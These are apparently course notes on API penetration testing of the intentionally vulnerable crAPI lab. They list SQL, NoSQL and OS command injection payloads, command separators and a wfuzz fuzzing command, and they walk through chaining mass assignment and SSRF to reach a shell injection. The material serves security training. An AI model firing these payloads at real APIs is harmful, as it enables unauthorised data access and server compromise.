# Injection Attacks  

>[Testing for Injection Vulnerabilities](https://university.apisec.ai/products/api-penetration-testing/categories/2150251361/posts/2157505668)  

## Discovering Injection Vulnerabilities  

>Fuzzing APIs is the process of sending various types of input to an endpoint to provoke an unintended response.  
>The payloads used for fuzzing include symbols, numbers, system commands, SQL queries, NoSQL queries, emojis, hexadecimal, boolean statements.  

>When reviewing API documentation, if the API is expecting a certain type of input (number, string, boolean value) send:

* Very large number
* very large string
* negative number
* string (instead of a number or boolean value)
* Random characters
* Boolean values
* Meta characters  

## SQL Injection  

```
'
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1

0'; select version() --+
```  

>Last payload at endpoint `http://127.0.0.1:8888/workshop/api/shop/apply_coupon`, return the version of the crAPI SQL server:  

![crapi-sql-injection-test.png](/images/crapi-sql-injection-test.png)  

## NoSQL Injection  

>List of [noSQL payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection), and sample below:  

```
$gt 
{"$gt":""}
{"$gt":-1}

$ne
{"$ne": 1}
{"$ne":""}
{"$ne":-1}
{'$ne': 1}
{'$ne':''}
{'$ne':-1}

$nin
{"$nin":1}
{"$nin":[1]}

{"$where":  "sleep(1000)"}
```  

>`$gt` is a MongoDB NoSQL query operator that selects documents that are greater than the provided value.  
>The `$ne` query operator selects documents where the value is not equal to the provided value.  
>The `$nin` operator is the `not in` operator, used to select documents where the field value is not within the specified array.  
>Many of the others in the list contain symbols that are meant to cause verbose errors.  
>Other payload samples attempt to bypassing authentication or waiting 10 seconds.  

>Enumeration of JSON POST body fields provide an error message that indicate possible noSQL:  

```JSON
{"error":"invalid character '$' after object key:value pair"}
```  

![crapi-nosql-injection-fuzzing.png](/images/crapi-nosql-injection-fuzzing.png)

>Result of fuzzing show noSQL injection, returning a shop coupon at the `/community/api/v2/coupon/validate-coupon`.  

![crapi-nosql-injection-fuzzing-result.png](/images/crapi-nosql-injection-fuzzing-result.png)  

## OS Command Injection  

>Operating system command injection attacks inject a command separator and operating system commands.  

```
|
||
&
&&
'
"
;
'"
```  

>Common Operating System Commands:  

```
ipconfig
dir
ver
whoami
ifconfig
ls
pwd
id
```

>Enumeration of endpoint to change video name, show several fields in the response for video format and conversion.  

![crapi-os-cmd-injection-enumeration.png](/images/crapi-os-cmd-injection-enumeration.png)  

```JSON
{
"id":202,
"video_name":"My Video Name",
"conversion_params":"-v codec h264",
"profileVideo":"data:image/jpeg;base64,AAAAGGZ0eXBtcDQyAAAAA snip "
}
```  

>Altering the PUT endpoint to add new field to change value indicate mass assignment vulnerability:  

```JSON
{"videoName":"My Video Name","conversion_params":"-v codec MASS ASSIGNMENT VULNERABILITY"}
```  

>Targeting the JSON parameter `conversion_params` in `PUT /identity/api/v2/user/videos/202` to find correct OS CMD inject escape and excution.  

>Once parameter conversion_params update with OS CMD payload and we get video, a 403 Forbidden response message indicate internal server on port `8080`:  

```JSON
{"message":"Thi-S endpoint S-hould be accessed only inte-Rnally. -Fine? , endpoint_url http://crapi-identity:8080/identity/api/v2/user/videos/convert_video","status":403}
```  

>need another SSRF vulnerability to trigger our payload.  
>Make a note of the URL that is given to us here.

```
http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id=202
```  

![crapi-mass-assignment-with-ssrf-trigger-to-exploit-os-cmd-injection-attack.png](/images/crapi-mass-assignment-with-ssrf-trigger-to-exploit-os-cmd-injection-attack.png)  

```
WOW. Look at you. Combining Mass Assignment and SSRF to exploit a hidden Shell Injection.
We're very proud. You won the game. Unfortunately, we don't actually  
allow our pentester to run arbitrary shell commands on our backend :( 
It could be very expensive and annoying to maintain it. 
Anyhow, if you host your own instance of crAPI, you can simply change the
`block_shell_injections` flag in the config file to allow real shell injections.
```  

## Fuzzing WFuzz  

```
wfuzz -z file,usr/share/wordlists/nosqli  -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ} http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon
```  

 


